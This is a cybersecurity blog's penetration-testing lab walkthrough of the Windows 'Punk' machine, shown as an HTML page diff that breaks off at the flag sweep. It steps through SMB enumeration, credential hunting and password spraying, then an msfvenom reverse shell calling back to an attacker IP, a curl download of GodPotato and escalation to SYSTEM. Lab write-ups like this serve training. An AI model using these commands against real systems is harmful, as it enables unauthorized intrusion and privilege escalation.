@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Punk - Complete Penetration Testing WalkthroughIntroductionThis is a complete walkthrough and writeup for the Punk machine from the Ronin66 lab. Punk is a standalone (non-domain) Windows 11 &#x2F; Ser">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ronin66-Punk">
+<meta property="og:url" content="https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Punk - Complete Penetration Testing WalkthroughIntroductionThis is a complete walkthrough and writeup for the Punk machine from the Ronin66 lab. Punk is a standalone (non-domain) Windows 11 &#x2F; Ser">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Punk/share-dev.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Punk/share-files-dev.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Punk/rid-users.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Punk/mail-it.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Punk/alan-access.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Punk/prod-share-access.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Punk/shell-as-svc_v.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Punk/got-potatoe.png">
+<meta property="article:published_time" content="2026-09-16T08:55:52.000Z">
+<meta property="article:modified_time" content="2026-09-16T09:08:34.854Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Ronin66">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Punk/share-dev.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Ronin66-Punk</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/03/14/VL-Klendathu/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&text=Ronin66-Punk"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&title=Ronin66-Punk"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&is_video=false&description=Ronin66-Punk"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ronin66-Punk&body=Check out this article: https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&title=Ronin66-Punk"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&title=Ronin66-Punk"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&title=Ronin66-Punk"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&title=Ronin66-Punk"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&name=Ronin66-Punk&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2026/09/16/Ronin66-Punk/&t=Ronin66-Punk"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Punk-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Punk - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">SMB Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Guest-Access-Discovery"><span class="toc-number">1.3.1.</span> <span class="toc-text">Guest Access Discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Engineering-the-NET-Assembly"><span class="toc-number">1.4.</span> <span class="toc-text">Reverse Engineering the .NET Assembly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Hunting"><span class="toc-number">1.5.</span> <span class="toc-text">Credential Hunting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Log"><span class="toc-number">1.5.1.</span> <span class="toc-text">FTP Log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RID-Brute-Force"><span class="toc-number">1.5.2.</span> <span class="toc-text">RID Brute Force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reading-the-Mailbox"><span class="toc-number">1.6.</span> <span class="toc-text">Reading the Mailbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POP3-Login"><span class="toc-number">1.6.1.</span> <span class="toc-text">POP3 Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decoding-the-Messages"><span class="toc-number">1.6.2.</span> <span class="toc-text">Decoding the Messages</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-Prod-Share-Code-Execution"><span class="toc-number">1.7.</span> <span class="toc-text">Initial Access - Prod Share Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Spraying-the-Default-Password"><span class="toc-number">1.7.1.</span> <span class="toc-text">Spraying the Default Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Building-the-Payload"><span class="toc-number">1.7.2.</span> <span class="toc-text">Building the Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">1.8.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checking-Privileges"><span class="toc-number">1.8.1.</span> <span class="toc-text">Checking Privileges</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GodPotato"><span class="toc-number">1.8.2.</span> <span class="toc-text">GodPotato</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Grabbing-the-Flags"><span class="toc-number">1.9.</span> <span class="toc-text">Grabbing the Flags</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.10.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools-Used"><span class="toc-number">1.11.</span> <span class="toc-text">Tools Used</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Ronin66-Punk
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-09-16T08:55:52.000Z" class="dt-published" itemprop="datePublished">2026-09-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Ronin66/" rel="tag">Ronin66</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Punk-Complete-Penetration-Testing-Walkthrough"><a href="#Punk-Complete-Penetration-Testing-Walkthrough" class="headerlink" title="Punk - Complete Penetration Testing Walkthrough"></a>Punk - Complete Penetration Testing Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is a complete walkthrough and writeup for the <strong>Punk</strong> machine from the Ronin66 lab. Punk is a standalone (non-domain) Windows 11 &#x2F; Server 2025 box that chains together a bit of everything: SMB guest access, some light .NET binary reverse engineering, credential hunting across an FTP log and a MailEnable mailbox, a default-password spray, and finally a scheduled-task abuse that drops us onto the host. From there we ride <code>SeImpersonatePrivilege</code> all the way to <code>NT AUTHORITY\SYSTEM</code> and grab both flags.</p>
+<p><strong>Tools Used:</strong> Nmap, NetExec, smbclient, monodis (mono-utils), ncat, msfvenom, Netcat, GodPotato</p>
+<p><strong>Difficulty:</strong> Easy &#x2F; Medium</p>
+<p><strong>Key Techniques:</strong> SMB guest enumeration, RID brute force, .NET assembly reverse engineering, POP3 mailbox reading, password spraying, scheduled-task &#x2F; prod-share code execution, <code>SeImpersonatePrivilege</code> abuse (GodPotato)</p>
+<hr>
+<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p>We begin with a full service scan to map out the attack surface. This is a standalone machine — no domain, no DC.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -sC 172.16.18.15 -vvvv</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">21/tcp    open  ftp           Microsoft ftpd</span><br><span class="line">| ftp-syst:</span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">25/tcp    open  smtp          MailEnable smptd 10.53--</span><br><span class="line">| smtp-commands: arakusa.corp [10.8.0.36], AUTH LOGIN, SIZE 40960000, HELP, AUTH=LOGIN</span><br><span class="line">|_ 211 Help:-&gt;Supported Commands: HELO,EHLO,QUIT,HELP,RCPT,MAIL,DATA,RSET,NOOP</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">110/tcp   open  pop3          MailEnable POP3 Server</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">143/tcp   open  imap          MailEnable imapd</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">587/tcp   open  smtp          MailEnable smptd 10.53--</span><br><span class="line">5040/tcp  open  unknown</span><br><span class="line">7680/tcp  open  pando-pub?</span><br><span class="line">49664-49673/tcp open msrpc    Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+<p>From the scan we get a good picture of what we’re dealing with:</p>
+<ul>
+<li><strong>Port 21</strong>: Microsoft FTP (anonymous access is disabled)</li>
+<li><strong>Ports 25 &#x2F; 110 &#x2F; 143 &#x2F; 587</strong>: a full MailEnable mail stack (SMTP, POP3, IMAP)</li>
+<li><strong>Port 80</strong>: IIS 10.0</li>
+<li><strong>Ports 135 &#x2F; 139 &#x2F; 445</strong>: SMB and RPC</li>
+</ul>
+<p>The mail stack and SMB are the most interesting surfaces, so that’s where we’ll start.</p>
+<hr>
+<h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><h3 id="Guest-Access-Discovery"><a href="#Guest-Access-Discovery" class="headerlink" title="Guest Access Discovery"></a>Guest Access Discovery</h3><p>FTP has no anonymous login, so we pivot to SMB and check whether the guest account is enabled and what it can see:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 172.16.18.15 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Punk/share-dev.png" alt="share-dev"></p>
+<p>Guest is enabled, and there’s a readable <strong>dev</strong> share. Let’s connect and see what’s inside:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient.py guest@172.16.18.15</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Punk/share-files-dev.png" alt="share-files-dev"></p>
+<p>The share holds two files — an executable and a DLL. We download both:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file OldCyber2077.exe OldCyber2077.dll</span><br><span class="line"></span><br><span class="line">OldCyber2077.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 10 sections</span><br><span class="line">OldCyber2077.dll: PE32+ executable for MS Windows 4.00 (console), x86-64 Mono/.Net assembly, 2 sections</span><br></pre></td></tr></table></figure>
+
+<p>The DLL is a <strong>Mono&#x2F;.NET assembly</strong>, which is great news — .NET decompiles almost back to source, so that’s where the logic (and hopefully some credentials) will live.</p>
+<hr>
+<h2 id="Reverse-Engineering-the-NET-Assembly"><a href="#Reverse-Engineering-the-NET-Assembly" class="headerlink" title="Reverse Engineering the .NET Assembly"></a>Reverse Engineering the .NET Assembly</h2><p>Since the DLL is managed .NET, we disassemble it with <code>monodis</code> (part of <code>mono-utils</code>) and read the IL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">monodis OldCyber2077.dll | less</span><br></pre></td></tr></table></figure>
+
+<p>At the end of the file, in the static constructor, we hit the jackpot — a set of hardcoded strings:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    // Method begins at RVA 0x2328</span><br><span class="line">    // Code size 41 (0x29)</span><br><span class="line">    .maxstack 8</span><br><span class="line">    IL_0000:  ldstr &quot;&lt;REDACTED&gt;:&lt;REDACTED&gt;&quot;</span><br><span class="line">    IL_0005:  stsfld string Cyber2077.Program::ftpCreds</span><br><span class="line">    IL_000a:  ldstr &quot;10.10.87.22&quot;</span><br><span class="line">    IL_000f:  stsfld string Cyber2077.Program::snmpTarget</span><br><span class="line">    IL_0014:  ldstr &quot;&lt;REDACTED&gt;&quot;</span><br><span class="line">    IL_0019:  stsfld string Cyber2077.Program::snmpPass</span><br><span class="line">    IL_001e:  ldstr &quot;&lt;REDACTED&gt;&quot;</span><br><span class="line">    IL_0023:  stsfld string Cyber2077.Program::snmpPass</span><br><span class="line">    IL_0028:  ret</span><br><span class="line">&#125; // end of method Program::.cctor</span><br></pre></td></tr></table></figure>
+
+<p>So the binary hands us:</p>
+<ul>
+<li>FTP credentials: <code>&lt;REDACTED&gt;:&lt;REDACTED&gt;</code></li>
+<li>An SNMP target on a different subnet: <code>10.10.87.22</code></li>
+<li>SNMP creds: <code>&lt;REDACTED&gt;</code> &#x2F; <code>&lt;REDACTED&gt;</code></li>
+</ul>
+<p>The <code>10.10.87.22</code> host is on another network, so we note it down as a likely later pivot and keep moving on the box in front of us.</p>
+<hr>
+<h2 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h2><h3 id="FTP-Log"><a href="#FTP-Log" class="headerlink" title="FTP Log"></a>FTP Log</h3><p>Now that we have the FTP credentials, we log into FTP and dig through what’s there:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 172.16.18.15</span><br></pre></td></tr></table></figure>
+
+<p>Inside a log file we find another set of credentials, this time for the mail service:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Contained artifact: smtp credentials found in config payload:</span><br><span class="line">&lt;REDACTED&gt;</span><br><span class="line">&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="RID-Brute-Force"><a href="#RID-Brute-Force" class="headerlink" title="RID Brute Force"></a>RID Brute Force</h3><p>Before spraying anything, we build a user list. The guest session lets us RID-brute the local SAM:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 172.16.18.15 -u &#x27;guest&#x27; -p &#x27;&#x27; --rid</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Punk/rid-users.png" alt="rid-users"></p>
+<p>This gives us the real local accounts — <code>eric</code>, <code>alan</code>, <code>&lt;REDACTED&gt;</code>, <code>svc_v</code>, alongside the usual built-ins. We drop them into <code>users.txt</code> and spray every credential we’ve collected so far:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 172.16.18.15 -u users.txt -p &#x27;&lt;REDACTED&gt;&#x27; &#x27;&lt;REDACTED&gt;&#x27; &#x27;&lt;REDACTED&gt;&#x27; --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Reading-the-Mailbox"><a href="#Reading-the-Mailbox" class="headerlink" title="Reading the Mailbox"></a>Reading the Mailbox</h2><h3 id="POP3-Login"><a href="#POP3-Login" class="headerlink" title="POP3 Login"></a>POP3 Login</h3><p>The SMTP creds from the FTP log are worth reading mail with. MailEnable is picky about the login format — it wants the bare mailbox name, not the full email address. We connect over POP3:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ncat -C 172.16.18.15 110</span><br><span class="line">USER &lt;REDACTED&gt;</span><br><span class="line">PASS &lt;REDACTED&gt;</span><br><span class="line">STAT</span><br><span class="line">LIST</span><br><span class="line">RETR 1</span><br><span class="line">RETR 2</span><br><span class="line">RETR 3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Punk/mail-it.png" alt="mail-it"></p>
+<h3 id="Decoding-the-Messages"><a href="#Decoding-the-Messages" class="headerlink" title="Decoding the Messages"></a>Decoding the Messages</h3><p>Two of the messages are base64-encoded. Decoding the first one gives us a company-wide notice from the CTO:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Team,</span><br><span class="line"></span><br><span class="line">There has been a public leak this year that affects default credentials on multiple vendor</span><br><span class="line">devices and services. Effective immediately, **everyone must change any default passwords**</span><br><span class="line">on the systems and appliances you manage.</span><br><span class="line"></span><br><span class="line">In particular, please replace any use of the default password **&lt;REDACTED&gt;** with a unique,</span><br><span class="line">strong password and document the change in the ticketing system. Focus first on:</span><br><span class="line">- Network devices (switches, routers, firewalls)</span><br><span class="line">- File shares and backups</span><br><span class="line">- Service accounts exposed to the network</span><br><span class="line"></span><br><span class="line">Confirm completion in the #it-ops channel or reply to this email once you have completed the</span><br><span class="line">changes for your scope.</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">Eric</span><br><span class="line">CTO</span><br><span class="line">arakusa.corp</span><br></pre></td></tr></table></figure>
+
+<p>That hands us a default password: <strong><code>&lt;REDACTED&gt;</code></strong>.</p>
+<p>The third message tells us exactly how the box wants us to get code execution:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Remove **Cyber2077.exe** from the **prod** share. **Disable the service / scheduled job that</span><br><span class="line">automatically scans the prod share and executes that binary.** The prod-share job runs on the</span><br><span class="line">host, references \\&lt;server&gt;\prod\cyber2077.exe, and will keep executing it.</span><br></pre></td></tr></table></figure>
+
+<p>Putting the two together: there’s a scheduled task that automatically executes whatever <code>cyber2077.exe</code> sits in the <strong>prod</strong> share, and <code>&lt;REDACTED&gt;</code> is a default password still in use somewhere. If we can find a user who can write to <strong>prod</strong>, we can drop our own <code>cyber2077.exe</code> and let the scheduled job run it for us.</p>
+<hr>
+<h2 id="Initial-Access-Prod-Share-Code-Execution"><a href="#Initial-Access-Prod-Share-Code-Execution" class="headerlink" title="Initial Access - Prod Share Code Execution"></a>Initial Access - Prod Share Code Execution</h2><h3 id="Spraying-the-Default-Password"><a href="#Spraying-the-Default-Password" class="headerlink" title="Spraying the Default Password"></a>Spraying the Default Password</h3><p>We spray <code>&lt;REDACTED&gt;</code> across our user list, hunting for anyone with write access to <strong>prod</strong>:</p>
+<p><img src="/images/Punk/alan-access.png" alt="alan-access"></p>
+<p>The user <strong>alan</strong> works. We check his share access:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 172.16.18.15 -u &#x27;alan&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Punk/prod-share-access.png" alt="prod-share-access"></p>
+<p><code>alan</code> has access to the <strong>prod</strong> share. That’s our code-execution primitive.</p>
+<h3 id="Building-the-Payload"><a href="#Building-the-Payload" class="headerlink" title="Building the Payload"></a>Building the Payload</h3><p>We generate a reverse shell named exactly what the scanner expects — <code>cyber2077.exe</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.36 LPORT=4444 -f exe -o cyber2077.exe</span><br></pre></td></tr></table></figure>
+
+<p>Start a listener:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p>And drop the payload into the prod share:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //172.16.18.15/prod -U &#x27;DESKTOP-CLM9MNF\alan%&lt;REDACTED&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Once the scheduled job fires, it executes our binary and we catch a shell.</p>
+<p><img src="/images/Punk/shell-as-svc_v.png" alt="shell-as-svc_v"></p>
+<p>The shell runs as <strong>svc_v</strong> — the service account behind the prod-share job.</p>
+<hr>
+<h2 id="Privilege-Escalation-to-SYSTEM"><a href="#Privilege-Escalation-to-SYSTEM" class="headerlink" title="Privilege Escalation to SYSTEM"></a>Privilege Escalation to SYSTEM</h2><h3 id="Checking-Privileges"><a href="#Checking-Privileges" class="headerlink" title="Checking Privileges"></a>Checking Privileges</h3><p>Being a service account, <code>svc_v</code> almost always carries impersonation rights, and sure enough:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SeImpersonatePrivilege</span><br></pre></td></tr></table></figure>
+
+<p>That’s the golden ticket for a potato attack.</p>
+<h3 id="GodPotato"><a href="#GodPotato" class="headerlink" title="GodPotato"></a>GodPotato</h3><p>We pull GodPotato onto the box from our HTTP server:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.8.0.36:9091/GodPotato-NET4.exe -o GodPotato-NET4.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Punk/got-potatoe.png" alt="got-potatoe"></p>
+<p>With <code>SeImpersonatePrivilege</code>, GodPotato impersonates the SYSTEM token. We can either pop a full shell or just run single commands as SYSTEM — here we go straight for the flags:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\GodPotato-NET4.exe -cmd &quot;cmd /c type C:\Users\Administrator\Desktop\root.flg&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>[*] CurrentUser: NT AUTHORITY\SYSTEM</code> — the box is ours.</p>
+<hr>
+<h2 id="Grabbing-the-Flags"><a href="#Grabbing-the-Flags" class="headerlink" title="Grabbing the Flags"></a>Grabbing the Flags</h2><p>The root flag comes straight off the Administrator desktop as SYSTEM. For the user flag, we sweep every profile:</p>
